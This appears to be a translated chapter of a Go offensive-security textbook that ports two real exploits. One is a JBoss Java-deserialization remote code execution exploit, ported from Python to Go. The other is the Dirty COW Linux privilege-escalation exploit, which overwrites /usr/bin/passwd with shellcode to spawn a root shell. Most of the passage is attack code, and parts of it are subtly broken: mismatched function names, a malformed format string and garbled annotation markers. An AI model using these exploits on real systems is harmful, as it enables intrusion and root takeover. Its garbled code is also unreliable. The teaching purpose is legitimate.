
## 包概述

- `debug`: 检查各种文件类型的元数据和内容
- `encoding`: 使用各种常见形式（二进制、Hex、Base64 等）对数据进行编码和解码
- `io` 和 `bufio`: 从文件系统、标准输出、网络连接等常见接口读写数据
- `net`: 通过 HTTP 和 SMTP 等各种协议促进客户端服务器交互
- `os`: 执行并与本地操作系统交互
- `syscall`: 暴露了用于底层系统调用的接口
- `unicode`: 使用 UTF-16 或 UTF-8 对数据进行编码和解码
- `unsafe`: 在与操作系统交互时用于避免 Go 的类型检查

诚然，某些包在随后的章节中会被证明更有用，特别是当我们讨论底层的 Windows 交互时，包含此列表是为了让你参考。

## 从 Python 移植漏洞

在第一个示例中，你将移植一个 2015 年发布的 Java 反序列化漏洞。该漏洞被分类在多个 CVE 下，影响常用应用程序、服务器和库中 Java 对象的反序列化¹ 该漏洞是由一个反序列化库引入的，它在服务器端执行之前没有验证输入（这是一个常见原因）。我们将关注缩小到 JBoss，这是一个流行的 Java 企业版应用程序服务器。

通过 `https://github.com/roo7break/serialator/blob/master/serialator.py`，你会发现一个包含多个应用程序利用逻辑的 Python 脚本。列表 9-3 提供了你复制的逻辑。

```python
def jboss_attack(HOST, PORT, SSL_On, _cmd):
```

## 下方代码基于 Nessus 中的 `jboss_java_serialize.nasl` 脚本

"""
函数为 JBoss 设置攻击载荷
"""

```python
body_serObj += hex2raw("ACED00053720032737--SNIPPED FOR
BREVITY--0174000")
```

```python
cleng = len(_cmd)
body_serObj += chr(_cmd)
body_serObj += hex2raw("740004657856537157--SNIPPED FOR BREVITY--
7E00A3")
```

```python
if SSL_On:
    webservice = httplib2.Http(disable_ssl_certificate_validation=True)
    URL_ADDR = "%s:%%s:%%s" ('http',HOST,PORT)
else:
    webservice = httplib2.Http()
    URL_ADDR = "%s:%%s:%%s" ('http',HOST,PORT)
headers = ("User-Agent":"JBoss_RCE_POC",
    "Content-type":"application/x-java-serialized-object--SNIPPED FOR
BREVITY--",
    "Content-length":"%d" % len(body_serObj)
"))
resp, content = webservice.request (
    URL_ADDR+"/invoker/JMXInvokerServlet",
    "POST",
    body=body_serObj,
    headers=headers
)
# print("Response received from target: %s" % resp)
```

列表 9-3：Python 序列化利用代码

让我们来看一下你正在处理的内容。该函数接收主机、端口、SSL 标识和操作系统命令作为参数。为了构建正确的请求，该函数必须创建一个表示序列化 Java 对象的载荷。该脚本首先将字节流硬编码到一个名为 `body_serObj` 的变量中。这些字节为了简洁起见被删减了，但请注意它们在代码中是以字符串值表示的。这是一个十六进制字符串，你需要将其转换为字节数组，以便字符串中的两个字符变成单个字节表示。例如，你需要将 `AC` 转换为十六进制的 `\xAC`。为了完成此转换，利用代码调用了一个名为 `hex2raw` 的函数。该函数的底层实现细节并不重要，只要你理解十六进制字符串正在发生什么即可。

接下来，脚本计算操作系统命令的长度，然后将长度和命令追加到 `body_serObj` 变量中 ②。脚本通过追加表示 JBoss 可以处理的格式的 Java 序列化对象剩余部分的额外数据，来完成载荷的构建 ③。一旦载荷构建完成，脚本将构建 URL 并在必要时设置 SSL 以忽略无效证书 ④。它设置了所需的 `Content-Type` 和 `Content-Length` HTTP 标头 ⑤，并向恶意请求发送到目标服务器 ⑥。

此脚本中展示的大部分内容对你来说应该并不陌生，因为我们在之前的章节中已经涵盖了大部分内容。现在只是以符合 Go 语言的方式编写等效函数了。列表 9-4 显示了该利用代码的 Go 版本。

```go
func boss(host string, ssl, cmd string) (int, error) {
serializedObject, err := hex.DecodeString("ACED0005737--SNIPPED FOR BREVITY--0174000") ①
if err != nil {
	return 0, err
}

serializedObject = append(serializedObject, byte(len(cmd))))
```

```go
serializedObject = append(serializedObject, []byte(cmd)...) ②
afterBuf, err := hex.DecodeString("740046057865637571--IPPED FOR
BREVITY--7E003A") Ⓙ
if err != nil {
    return 0, err
}
serializedObject = append(serializedObject, afterBuf...)

var client *http.Client
var url string
if ssl {
    client = &http.Client{
        Transport: &http.Transport{
            TLSConfig: &tls.Config{
                InsecureSkipVerify: true,
            },
        },
        url = fmt.Sprintf("https://%s/invoker/JMXInvokerServlet", host)
} else {
    client = &http.Client{
    url = fmt.Sprintf("http://%s/invoker/JMXInvokerServlet", host)
    }
}

req, err := http.Request("POST", url, bytes.NewReader(serializedObject))
if err != nil {
    return 0, err
}
req.Header.Set(⒩
    "User-Agent",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Gecko")
req.Header.Set(
    "Content-Type",
    "application/x-java-serialized-object;class=org.jboss.invocation.MarshalledValue")
resp, err := client.Do(req) ⒨
if err != nil {
    return 0, err
}
```

```go
return resp.StatusCode, nil
}
```

列表 9-4：原始 Python 序列化利用的 Go 等效实现 `ch-9/jboss/main.go`

该代码几乎是 Python 版本的逐行复制。因如此，我们设置了注释使其与 Python 版本对应，这样你就能跟上我们所做的更改。

首先，你通过定义序列化 Java 对象字节来构建载荷 ①，并硬编码了操作系统命令之前的部分。与依赖自定义逻辑将十六进制字符串转换为字节数组的 Python 版本不同，Go 版本使用了 `encoding/hex` 包中的 `hex.DecodeString()`。接下来，你确定操作系统命令的长度，然后将命令本身追加到载荷中 ②。你通过解码硬编码的十六进制后缀字符串并追加到现有载荷中来完成载荷的构建 ③。部分代码比 Python 版本稍微冗长，因为我们特意增加了额外的错误处理，但它能够使用 Go 的标准编码包轻松地解码你的十六进制字符串。

你继续初始化 HTTP 客户端 ④，根据要求配置 SSL 通信，然后构建 POST 请求。在发送请求之前，你设置了必要的 HTTP 标头 ⑤，以便 JBoss 服务器解释内容类型。最后，通过调用 `client.Do(req)` 将恶意请求发送到目标服务器 ⑥。

可以在 `https://www.exploit-db.com/exploits/40616/` 找到我们想要复制的那个。列表 9-5 显示了原始原始利用代码，为了可读性进行了略微修改。

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;

// 如果没有读取权限则修改此处
char suid_binary[] = "/usr/bin/passwd";

unsigned char sc[] = {
0x7f, 0x45, 0x4c, 0x46, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
--snip--
0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;

void *madviseThread(void *arg)
{
char *str;
str=(char*)arg;
int i,c=0;
for(i=0;i<1000000 && !stop;i++) {
c+=madvise(map,100,MADV_DONTNEED);
}
printf("thread stopped\n");
}
```

```c
void *procselfmemThread(void *arg) 
{
  char *str;
  str=(char*)arg;
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<1000000 && !stop;i++) {
    lseek(f,map,MAP_SEEK_SET);
    c+=write(f, str, sc_len);
  }
  printf("thread stopped\n");
}
```

```c
void *WaitFor(void *arg) { 
  char buf[sc_len];

for(;;) {
    FILE *fp = fopen(suid_binary,"rb");

    read(buf, sc_len, 1, fp);

    if(memcmp(buf, sc, sc_len) == 0) {
      printf("%s is overwritten\n",suid_binary);
      break;
    }
    fclose(fp);
    sleep(1);
  }

stop = 1;

printf("Popping root shell.\n");
printf("Don't forget to restore /tmp/bak\n");

system(suid_binary);
}

int main(int argc,char *argv[]) {
  char *backup;

printf("Dirty Cow privilege escalation\n");
printf("Backing up %s.. to /tmp/bak\n", suid_binary);

asprintf(&backup, "cp %s /tmp/bak", suid_binary);
system(backup);

f = open(suid_binary,O_RDONLY);
fstat(f,&st);

printf("Size of: %d\n", st.st_size);

char payload[st.st_size];
memset(payload, 0x90, st.st_size);
memcpy(payload, sc, sc_len+1);

map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);

printf("Racing, this may take a while.\n");

pthread_create(&pth1, NULL,&adviseThread, suid_binary);
pthread_create(&pth2, NULL,&procselfMemThread, payload);
pthread_create(&pth3, NULL,&waitForWrite, NULL);

pthread_join(pth3, NULL);

return 0;
}
```

列表 9-5: 用 C 语言编写的 Dirty COW 提权漏洞利用程序

与其解释 C 代码逻辑的细节，让我们概括地看一下它，然后将其分成若干部分与 Go 版本进行逐行对比。

该利用程序定义了一些位于可执行和链接格式（ELF）中的恶意 shellcode，用于生成一个 Linux shell。它通过创建多个调用各种系统函数向内存位置写入数据的线程，以特权用户执行代码。最终，shellcode 通过覆盖一个恰好设置了 SUID 位且属于 root 用户的二进制可执行文件的内容来利用漏洞。在这种情况下，该二进制文件是 `/usr/bin/passwd`。通常情况下，非 root 用户无法覆盖该文件。然而，由于 Dirty COW 漏洞，你可以实现提权，因为你可以在保留权限的同时向文件写入任意内容。

现在，让我们将 C 代码拆分为易于理解的部分，并将每个部分与 Go 的等效代码进行比较。请注意，Go 版本特别地尝试实现 C 版本的逐行复制。列表 9-6 显示了在 C 中于函数外部定义或初始化的全局变量，而列表 9-7 显示了它们在 Go 中的表示形式。

```c
void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1,pth2,pth3;

// 如果没有读取权限则修改此处
char suid_binary[] = "/usr/bin/passwd";

unsigned char sc[] = {
0x7f, 0x45, 0x4c, 0x46, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
--snip--
0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
};
unsigned int sc_len = 177;
```

列表 9-6: C 中的初始化

```go
var map uintptr
var signals = make(chan bool, 2)
```

```go
const SuidBinary = "/usr/bin/passwd"
```

```go
var sc = []byte{
0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
--snip--
0x68, 0x00, 0x56, 0x57, 0x48, 0xe6, 0x0f, 0x05,
}
```

列表 9-7: Go 中的初始化

C 和 Go 之间的翻译是非常直观的。C 和 Go 的两个部分通过编号展示了 Go 如何实现与 C 代码相同的功能。在两种情况下，你都通过定义 `uintptr` 变量来跟踪内存。与 C 不同，`map` 是 Go 中的保留关键字。你随后初始化了一个变量来信号线程停止，而不是像 C 代码那样使用整数；Go 的做法是使用缓冲通道。你显式地定义了它的长度为 2，因为会有两个并发函数想要发送信号。接下来，你定义了一个字符串并将 shellcode 硬编码进切片。与 C 版本相比，Go 代码省略了一些全局变量，这意味着你需要在相应的块中定义它们。

接下来，让我们看看 `madvise()` 和 `procselfmem()`，这是利用竞态条件的两个函数。我们再次比较列表 9-8 中的 C 版本与列表 9-9 中的 Go 版本。

```c
void *madviseThread(void *arg)
{
char *str;
str=(char*)arg;
int i,c=0;
for(i=0;i<1000000 && !stop;i++) {
  c+=madvise(map,100,MADV_DONTNEED);
}
printf("thread stopped\n");
}
```
